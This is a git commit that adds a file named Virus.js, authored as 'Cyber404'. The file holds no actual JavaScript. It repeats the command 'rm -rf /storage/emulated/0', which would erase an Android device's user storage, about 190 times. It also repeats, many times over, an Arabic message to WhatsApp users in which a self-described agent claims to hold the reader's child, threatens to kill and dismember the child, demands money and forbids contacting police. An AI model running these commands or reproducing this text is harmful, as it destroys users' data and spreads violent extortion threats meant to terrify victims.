eb2e25677121f962776182c4bfb200e3bb4ff216
Cyber404 <mfatoniazizi@gmail.com>
2025-01-06 13:50:59 +0700

    Add files via upload

---
+++ projekv45/Virus.js
@@ -0,0 +1,249 @@
+Delete Path /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآ
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+مرحبًا يا مستخدمي الواتس اب، اسمحوا لي أن أقدم نفسي، أنا عميل (مايكل برونسون). لست بحاجة إلى معرفة حقيقة من أنا. طفلك في مكاننا، سأقتل طفلك وأبيع دماغه وأمعائه والقضيب وجميع أعضاء الجسم الأخرى. إذا أراد طفلك النجاة من هذا الحادث، استبدل  المال فلن أتردد في طعن طفلك في رأس
+اتصل بالرقم أدناه فورا 
+لا تخبر هذه القضية لأي شخص أبدًا، ولا تخبر هذه القضية للشرطة إذا أخبرت الشرطة سأقتل طفلك الآن
+Delete Path /storage/emulated/0
